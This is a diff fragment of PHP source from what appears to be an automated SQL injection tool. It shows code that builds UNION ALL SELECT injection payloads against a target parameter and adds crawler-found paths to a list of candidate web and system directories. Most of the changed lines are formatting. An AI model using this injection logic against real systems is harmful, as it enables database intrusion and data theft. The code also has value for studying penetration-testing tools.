@@ -493,15 +493,20 @@
 				}
 
 				if($useEndingPayload){
+
 					$value		= "$value UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
 				}else{
+
 					$value		= "$value UNION ALL SELECT $injection ".$this->getQueryCommentOpen();
+
 				}
 
-				$content		= $this->execute($variable,$value);
+				$content			=	$this->execute($variable,$value);
 
 				if($content===FALSE){
-					throw (new \Exception("There was a problem processing the request! Got ". $this->_httpCode."!!!"));
+
+					throw(new \Exception("There was a problem processing the request! Got ". $this->_httpCode."!!!"));
+
 				}
 
 				return $this->checkInjection($content);
@@ -530,6 +535,7 @@
 						$match = preg_replace("/^($openTag)/",'',$match);
 						$match = preg_replace("/($closeTag)/",'',$match);
 						$matching[$key]=$match;
+
 					}
 
 					return $matching;
@@ -611,19 +617,34 @@
 
 				$restoreUrl				=	$this->_httpAdapter->getUrl();
 
-				var_dump($crawler->getFiles());
-				die();
-
 				$webDefaultsPlugin	=	$pLoader->getPluginInstance("disclosure","defaults",$this->_httpAdapter,$this->_log);
 				$information			=	$webDefaultsPlugin->getInfo();
 
 				if (!is_a($information,"\\aidSQL\\plugin\\disclosure\\DisclosureResult")){
+
 					throw(new \Exception("Plugin $plugin[name] should return an instance of \\aidSQL\\plugin\\disclosure\\DisclosureResult"));
 				}
 
-				$webDirectories		=	$information->getWebDirectories();
+				$webDirectories	=	$information->getWebDirectories();
+				
+				foreach($crawler->getFiles() as $file=>$type){
+	
+					$path	=	dirname($file);
 
-				array_unshift($webDirectories,"");
+					if($path=='.'){
+						continue;
+					}
+
+					if(!in_array($path,$webDirectories)){
+
+						$this->log("Adding crawler path information: $path",0,"light_green");
+						array_unshift($webDirectories,$path);
+
+					}
+
+				}
+
+				array_unshift($webDirectories,'');
 
 				$unixDirectories		=	$information->getUnixDirectories();
 				$winDirectories		=	$information->getWindowsDirectories();
